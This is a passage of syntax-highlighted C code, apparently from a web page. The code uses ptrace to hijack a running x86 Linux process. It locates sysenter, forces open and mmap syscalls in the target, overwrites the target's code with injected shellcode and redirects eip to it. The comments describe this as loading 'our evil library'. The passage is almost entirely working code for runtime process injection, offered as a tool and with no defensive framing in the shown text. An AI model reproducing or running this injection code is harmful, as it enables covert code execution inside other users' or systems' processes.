&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* this works only if sysenter isn't at random location */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>tmp, 0xffffe000, <span style="color: #cc66cc;">8192</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">8192</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i<span style="color: black;">]</span> == 0x0f &amp;&amp; tmp<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == 0x34<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter = 0xffffe000 + i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; sysenter -= <span style="color: #cc66cc;">5</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!sysenter<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Unable to find sysenter<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Sysenter found: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, sysenter<span style="color: black;">)</span>;&nbsp; &nbsp; &nbsp; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/*<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sysenter should point to: <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %ecx<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %edx<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %ebp<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp;%esp,%ebp<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter <br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;*/</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_attach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_open;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = <span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span>data_segment;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = <span style="color: #cc66cc;">0</span>; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>reg.<span style="color: #202020;">eax</span> != SYS_open<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; offset = <span style="color: black;">(</span>data_segment + strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span><span style="color: black;">)</span> + <span style="color: #cc66cc;">8</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_mmap;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">4</span>, text_length + <span style="color: black;">(</span>PAGE_SIZE - <span style="color: black;">(</span>text_length &amp; <span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">8</span>, <span style="color: #cc66cc;">5</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// PROT_READ|PROT</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">12</span>, <span style="color: #cc66cc;">2</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// MAP_SHARED</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">16</span>, fd<span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// fd</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">20</span>, text_offset<span style="color: black;">)</span>; &nbsp; <br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>reg.<span style="color: #202020;">eax</span> != SYS_mmap<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; evil_base = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_mmap;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = offset;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">4</span>, data_length + <span style="color: black;">(</span>PAGE_SIZE - <span style="color: black;">(</span>data_length &amp; <span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">8</span>, <span style="color: #cc66cc;">3</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// PROT_READ|PROT_WRITE</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">12</span>, <span style="color: #cc66cc;">2</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// MAP_SHARED</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">16</span>, fd<span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// fd</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">20</span>, data_offset<span style="color: black;">)</span>; &nbsp; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Restoring data segment<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span> + <span style="color: #cc66cc;">32</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>orig_ds + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = eip;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = eax;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = ebx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = ecx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">edx</span> = edx; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">esp</span> = esp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<span style="color: black;">}</span><br>
<span style="color: #808080; font-style: italic;">/* function to load our evil library */</span><br>
<span style="color: #993333;">int</span> mmap_library<span style="color: black;">(</span><span style="color: #993333;">int</span> pid<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> &nbsp;user_regs_struct reg;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> eip, esp, <span style="color: #993333;">string</span>, offset, str,<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax, ebx, ecx, edx;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j = <span style="color: #cc66cc;">0</span>, ret, status;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> buf<span style="color: black;">[</span><span style="color: #cc66cc;">30</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> saved_text<span style="color: black;">[</span><span style="color: #cc66cc;">94</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *p;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; eip = reg.<span style="color: #202020;">eip</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; esp = reg.<span style="color: #202020;">esp</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ebx = reg.<span style="color: #202020;">ebx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ecx = reg.<span style="color: #202020;">ecx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; edx = reg.<span style="color: #202020;">edx</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; offset = text_base;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%%eip -&gt; 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, eip<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Injecting mmap_shellcode at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, offset<span style="color: black;">)</span>;<br>
&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* were going to load our shellcode at base */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* first we must backup the original code into saved_text */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; p = <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *<span style="color: black;">)</span>buf;<br>
&nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span>saved_text, p, <span style="color: #cc66cc;">90</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Here is the saved code we will be overwriting:<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>, i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>j++ % <span style="color: #cc66cc;">20</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\\</span>x%.2x"</span>, saved_text<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* load shellcode into text starting at eip */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>mmap_shellcode + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>Verifying shellcode was injected properly, does this look ok?<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; j = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; p = <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *<span style="color: black;">)</span> buf;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>, i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>j++ % <span style="color: #cc66cc;">20</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\\</span>x%.2x"</span>, p<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>Setting %%eip to 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, offset<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = offset + <span style="color: #cc66cc;">2</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
